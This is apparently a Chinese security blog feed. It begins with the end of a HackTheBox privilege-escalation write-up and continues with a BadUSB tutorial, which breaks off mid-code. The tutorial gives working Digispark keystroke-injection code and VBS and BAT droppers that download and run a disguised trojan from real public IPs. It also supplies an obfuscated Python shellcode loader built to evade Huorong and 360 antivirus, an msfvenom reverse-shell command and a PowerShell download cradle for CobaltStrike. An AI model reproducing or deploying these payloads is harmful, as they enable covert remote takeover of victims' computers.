class="line">18</span><br></pre></td><td class="code"><pre><span class="line">--timefmt 时间格式</span><br><span class="line">    %y年 %m月 %d日 %H小时 %M分钟</span><br><span class="line">--format 输出格式</span><br><span class="line">    %T时间 %w路径 %f文件名 %e状态</span><br><span class="line"> </span><br><span class="line">-m 始终保持监听状态，默认触发事件即退出</span><br><span class="line">-r 递归查询目录</span><br><span class="line">-q 减少不必要的输出(只打印事件信息)</span><br><span class="line"> </span><br><span class="line">-e 定义监控的事件，可用参数：</span><br><span class="line">    open   打开文件</span><br><span class="line">    access 访问文件</span><br><span class="line">    modify 修改文件</span><br><span class="line">    delete 删除文件</span><br><span class="line">    create 新建文件</span><br><span class="line">    attrib 属性变更</span><br><span class="line"> </span><br><span class="line">--exclude &lt;pattern&gt; 指定要排除监控的文件/目录</span><br></pre></td></tr></table></figure><p>可以看出此处inotifywait监控的事件是&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csv文件的更改。尝试修改一下&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csv文件，看看进程变化：</p><p><a href="https://pic.imgdb.cn/item/63d5eeffface21e9efebe099.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eeffface21e9efebe099.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/63d5ef0dface21e9efebfa54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef0dface21e9efebfa54.jpg"></a></p><p>发现上图中这里使用了具有root权限的mail命令，将”Leave Request:”加上我们写入到&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csv中的内容（“test”）发送给了christine用户。这里仍然存在命令注入。参考链接：<a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p><p>根据gtfobins中介绍的，我们可以想到利用mail命令的–exec参数来执行shell脚本。编写shell脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">chmod +s /bin/bash</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63d5ef19face21e9efec1089.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef19face21e9efec1089.jpg"></a></p><p>接着进行命令注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@awkward:~/private$ echo &#x27;&quot; --exec=&quot;\!/tmp/2.sh&quot;&#x27; &gt;&gt; leave_requests.csv</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63d5ef2aface21e9efec2fb7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef2aface21e9efec2fb7.jpg"></a></p><p>接着以SUID启动&#x2F;bin&#x2F;bash，查看root.txt:</p><p><a href="https://pic.imgdb.cn/item/63d5ef39face21e9efec4f5b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ef39face21e9efec4f5b.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探BadUSB</title>
      <link href="/2022/12/01/badusb/"/>
      <url>/2022/12/01/badusb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近偶然了解到”BadUSB”，感觉很好玩，试着制作了一个，过程很曲折坎坷。我也尝试去绕过了一些AntiVirus的检测，结果也是比较让自己满意的。接下来的文章我将按照我的思路进行，写一下BadUSB的制作过程，以及遇到的困难和解决办法。（小白文，可能有些基础的东西解释的有点多）</p><h2 id="BadUSB原理浅析"><a href="#BadUSB原理浅析" class="headerlink" title="BadUSB原理浅析"></a>BadUSB原理浅析</h2><p>在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为BadUSB，该漏洞由Karsten Nohl和Jakob Lell共同发现。在分析BadUSB的原理前，我认为应该先了解一下HID攻击原理。</p><h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。</p><p>在BadUSB出现之前，利用HID进行攻击的方式一般有两种：USB RUBBER DUCKY和TEENSY。这两种攻击方式，是在BadUSB公布之前，比较流行的两种HID攻击方式。缺陷在于要定制硬件设备，通用性较差。但是BadUSB就不一样了，它是在“USB RUBBER DUCKY”和“Teensy”攻击方式的基础上用通用的USB设备（比如U盘）。</p><h3 id="BadUSB个人理解"><a href="#BadUSB个人理解" class="headerlink" title="BadUSB个人理解"></a>BadUSB个人理解</h3><p>通俗一点来解释BadUSB的攻击方式：当BadUSB插入PC后，会模拟出一个虚拟键盘，同时执行我们事先写入到固件中的代码来敲击相应的按键，输入攻击代码从而完成一些恶意行为，如远程下载木马并执行或者强制关机等等（强制关机可能有点捉弄人……）。</p><p>U盘的内部构造：</p><p><a href="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png"></a></p><p>可以看到，U盘大致由两部分组成，一部分是芯片引导程序，一部分是闪存区域。</p><p>芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。我们的恶意代码正是写入在固件中，而这部分区域是杀毒软件无法访问的区域，因此大部分杀毒软件是根本无法应对BadUSB攻击的。</p><p>我们可以想象这样一个场景，黑客在咖啡厅、机场或者公园的长椅故意放置这种写入了恶意程序的USB硬件，有些人可能会因为好奇捡走这些设备，并迫不及die地插入电脑中想要看看里面有什么宝藏，而这正陷入了黑客设计的陷阱中。这种攻击行为也经常被利用在一些护网行动中，有些红队成员会故意在现场落下一个U盘，被蓝队成员捡走后插入电脑中，成功获得蓝队成员电脑的控制权。</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>1、一台有公网IP的服务器</p><p>2、一块淘宝上14块钱购买的Digispark开发板：</p><p><a href="https://pic.imgdb.cn/item/63886f5c16f2c2beb11c2648.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63886f5c16f2c2beb11c2648.png"></a></p><p>3、软件驱动：</p><p>下载地址：<a href="https://github.com/digistump/DigistumpArduino/releases">https://github.com/digistump/DigistumpArduino/releases</a></p><p>4、Arduino IDE(Arduino IDE的安装和配置教程网上很多，这里不再赘述)</p><p>5、CobaltStrike</p><p>6、Metasploit</p><h2 id="Bypass-火绒"><a href="#Bypass-火绒" class="headerlink" title="Bypass 火绒"></a>Bypass 火绒</h2><h3 id="vbs编写"><a href="#vbs编写" class="headerlink" title="vbs编写"></a>vbs编写</h3><p>关于绕过火绒，我的思路是这样的：首先利用Metasploit生成shellcode，然后编写免杀代码进行免杀生成exe马，接着利用windows的makecab命令来压缩这个exe马为zip，接着把生成的zip放在公网服务器上。插入BadUSB后，程序模拟键盘输入如下内容至microsoft.vbs文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set ws=WScript.CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line"></span><br><span class="line">ws.Run&quot;cmd.exe /c mkdir c:\temp1 &amp;&amp; bitsadmin  /transfer n http://124.221.248.16:888/QQ_cache.zip c:\temp1\QQ_cache.zip &amp;&amp; expand c:\temp1\QQ_cache.zip c:\temp1\QQ_cache.exe &amp;&amp; del c:\temp1\QQ_cache.zip &amp;&amp; c:\temp1\QQ_cache.exe&quot;,0</span><br></pre></td></tr></table></figure><p>接着执行这个vbs文件。那么这段代码的含义是什么呢？</p><p>首先创建一个C:\temp1文件夹，接着在公网服务器上下载生成的zip文件至这个文件夹，利用expand解压zip文件得到exe马，然后删除zip文件并执行exe马。</p><p>这里有几个问题。首先我为什么会使用bitsadmin来下载文件而非certutil或powershell呢？</p><p>原因是bitsadmin下载方式相对于certutil和powershell下载方式来说免杀效果似乎更好。在我的电脑上（已安装火绒杀毒软件）测试，使用certutil下载文件，火绒虽未报警，却会在安全日志中存在记录，而如果利用powershell下载的话则会直接报警：</p><p><a href="https://pic.imgdb.cn/item/63887a0f16f2c2beb12ae74d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63887a0f16f2c2beb12ae74d.png"></a></p><p><a href="https://pic.imgdb.cn/item/63887a0316f2c2beb12ad9ea.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63887a0316f2c2beb12ad9ea.png"></a></p><p>那么为什么要多此一举的在公网服务器上放置的木马文件是zip文件而不直接是exe马呢？因为直接下载exe的话不论什么下载命令杀毒软件都会直接报警，而如果下载的是zip文件，火绒是不会报警的。并且我们可以直接利用windows自带的解压命令expand来解压该zip文件。</p><p>最后一个也是最重要的问题是解压下来的木马文件，也就是木马.exe文件如何做免杀从而绕过火绒或者说大部分杀软呢？</p><h3 id="免杀木马编写"><a href="#免杀木马编写" class="headerlink" title="免杀木马编写"></a>免杀木马编写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">shell_code,keys</span>):</span><br><span class="line">    shell_code_base64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    random.seed(keys)</span><br><span class="line">    code = shell_code.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        item = <span class="built_in">int</span>(item)</span><br><span class="line">        shell_code_base64 += <span class="built_in">chr</span>(item ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> shell_code_base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fs_decode</span>(<span class="params">funcs</span>):</span><br><span class="line">    fs_keys = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    func_codes = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    random.seed(fs_keys)</span><br><span class="line">    func_code = funcs.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> func_code:</span><br><span class="line">        item = <span class="built_in">int</span>(item)</span><br><span class="line">        func_codes += <span class="built_in">chr</span>(item ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> func_codes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">ShellCode,keys</span>):</span><br><span class="line">    random.seed(keys)</span><br><span class="line">    ShellCode_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ShellCode:</span><br><span class="line">        ShellCode_2 += <span class="built_in">str</span>(<span class="built_in">ord</span>(item) ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line">    ShellCode_2 = ShellCode_2.strip(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ShellCode_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">shellcode</span>):</span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">    funcs = <span class="string">&#x27;70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86&#x27;</span></span><br><span class="line">    func = fs_decode(funcs)</span><br><span class="line">    <span class="built_in">exec</span>(func)</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ShellCode = <span class="string">&#x27;&#x27;&#x27; ShellCode &#x27;&#x27;&#x27;</span></span><br><span class="line">    keys = <span class="string">&#x27;Axx8&#x27;</span></span><br><span class="line">    shell_code = encode(ShellCode.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),keys)</span><br><span class="line">    shellcode = decode(shell_code,keys)</span><br><span class="line">    shellcode = base64.b64decode(shellcode)</span><br><span class="line">    run(shellcode)</span><br></pre></td></tr></table></figure><p><strong>生成ShellCode</strong></p><p><code>msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=vps\_ip lport=vps\_port --encrypt base64 -f c</code></p><p>生成的shellcode直接替换给出的代码中的ShellCode即可。</p><p>接着我们利用pyinstaller生成一个exe文件：</p><p><code>pyinstaller -F -i qq.ico QQ\_cache.py</code></p><p><a href="https://pic.imgdb.cn/item/63887d9516f2c2beb132d8e4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63887d9516f2c2beb132d8e4.jpg"></a></p><p>这个木马亲测可绕过360和火绒。因为在我的公网服务器上并没有metasploit，因此上述生成shellcode的操作我是在自己的kali上实现的。因为不太想在公网服务器上下载一个metasploit，因此我利用frp实现了个内网穿透，在自己kali的metasploit上监听1234端口，frp配置如下：</p><p>frps.ini：</p><p><a href="https://pic.imgdb.cn/item/6388ce5016f2c2beb1d0a9e7.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce5016f2c2beb1d0a9e7.png"></a></p><p>frpc.ini：</p><p><a href="https://pic.imgdb.cn/item/6388ce5e16f2c2beb1d0b8ac.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce5e16f2c2beb1d0b8ac.png"></a></p><h3 id="编写Arduino代码"><a href="#编写Arduino代码" class="headerlink" title="编写Arduino代码"></a>编写Arduino代码</h3><p>接着就是完成Arduino代码了，这里直接给出代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//开启CapsLock大写锁定键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//按下Win+R键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MODE CON: cols=16 lines=1 &amp;&amp; color fe&quot;</span>);<span class="comment">//尽可能隐藏cmd窗口</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">100</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO SET WS=wsCRIPT.cREATEoBJECT(\&quot;wsCRIPT.sHELL\&quot;) &gt; MICROSOFT.VBS&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO WS.rUN\&quot;CMD.EXE /C MKDIR C:\\TEMP1 &amp;&amp; BITSADMIN  /TRANSFER N HTTP://43.139.114.127:888/qq_CACHE.ZIP C:\\TEMP1\\qq_CACHE.ZIP &amp;&amp; EXPAND C:\\TEMP1\\qq_CACHE.ZIP C:\\TEMP1\\qq_CACHE.EXE &amp;&amp; DEL C:\\TEMP1\\qq_CACHE.ZIP &amp;&amp; C:\\TEMP1\\qq_CACHE.EXE\&quot;,0 &gt;&gt;MICROSOFT.VBS&quot;</span>);<span class="comment">//将命令代码写入vbs文件</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MICROSOFT.VBS&quot;</span>);<span class="comment">//执行vbs文件</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;exit&quot;</span>);<span class="comment">//退出cmd</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//关闭CapsLock大写锁定键</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为之前从未接触过Arduino，因此我在制作时，绝大部分的时间浪费在了编写Arduino代码的部分。这里提一下我遇到的问题吧。</p><p>首先是中文输入法所导致的命令输入不成功。解决办法很简单，就是按下CapsLock，因为Windows大小写不敏感。CapsLock键在DigiKeyboard.h库中是57。</p><p>接着呢就是DigiKeyboard的一些方法的调用了。其实网上搜索一波<code>DigiKeyboard.h</code>就可以找到源代码：<a href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h">https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h</a>。审计一下源代码就知道了。</p><p>用秒表测了一下，插入USB 14秒左右全部命令即可被执行完成，执行完命令后就可以拔出USB了。</p><p>接下来请看效果：</p><p><a href="https://watch.wave.video/4Ao60qmNYCgQx2ZI">https://watch.wave.video/4Ao60qmNYCgQx2ZI</a></p><h2 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h2><p>接着就是艰难的绕过360了。当我满心欢喜地拿着可以绕过火绒的BadUSB来插入装有360的虚拟机的时候，我发现在执行vbs文件的那一步命令的时候360就给我拦住了。寄！</p><p><a href="https://pic.imgdb.cn/item/6388ce6816f2c2beb1d0c3de.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce6816f2c2beb1d0c3de.png"></a></p><p>并且360会对bitsadmin命令提出警告，也会对expand解压下载下来的zip文件的操作进行警告。因此360似乎有点难绕（尽管我们上面生成的exe马360也检测不到，但是把它传入到用户的PC上似乎并不是一件易事）。那我们就得换一个思路了，我这里想到的思路是通过powershell执行CobaltStrike的命令来拿到shell。</p><h3 id="powershell免杀"><a href="#powershell免杀" class="headerlink" title="powershell免杀"></a>powershell免杀</h3><p>我们都知道，各个杀毒软件对于powershell执行命令都做了严格的过滤和限制，因此直接执行powershell命令肯定会被360检测到并弹出警告。这就需要我们进行powershell混淆了。这里直接给出payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">Invoke-Expression</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://43.139.114.127:1235/a&#x27;</span>) | powershell -</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><a href="https://pic.imgdb.cn/item/6388ce7616f2c2beb1d0d2b7.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce7616f2c2beb1d0d2b7.png"></a></p><p>成功绕过360与火绒，上线CS。</p><h3 id="编写bat"><a href="#编写bat" class="headerlink" title="编写bat"></a>编写bat</h3><p>虽然上面的powershell命令混淆可以绕过360，但是似乎有一个痛点。那就是如果执行powershell后，cmd窗口会一直存在。要是cmd窗口被关掉了，那shell不就白拿了吗？因此我们需要找到一种方法不弹cmd窗口，让受害者难以发现，做到“润物细无声”。这里我找到的方法是跟上面绕过火绒的方法类似，但是不再是编写vbs文件了（因为360对于vbs文件的检测过于严格），而是编写bat文件。bat文件也可以执行系统命令，同时可以添加一些命令让命令行窗口消失，再加上360对于bat文件的检测较为宽松，因此将命令写入bat文件就成了我的首选。</p><p>直接给出bat文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off </span><br><span class="line">if &quot;%1&quot;==&quot;h&quot; goto begin </span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close) </span><br><span class="line">EXIT</span><br><span class="line">:begin </span><br><span class="line">cmd /k &quot;echo Invoke-Expression(new-object net.webclient).downloadstring(&#x27;http://43.139.114.127:1235/a&#x27;) | powershell -&quot; </span><br></pre></td></tr></table></figure><h3 id="编写Arduino"><a href="#编写Arduino" class="headerlink" title="编写Arduino"></a>编写Arduino</h3><p>接着给出Arduino代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_M);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_D);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_N);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">51</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_S);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">46</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">35</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_I);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_N);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_S);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">46</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">36</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">36</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_F);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO @ECHO OFF &gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO IF \&quot;%1\&quot;==\&quot;H\&quot; GOTO BEGIN &gt;&gt; 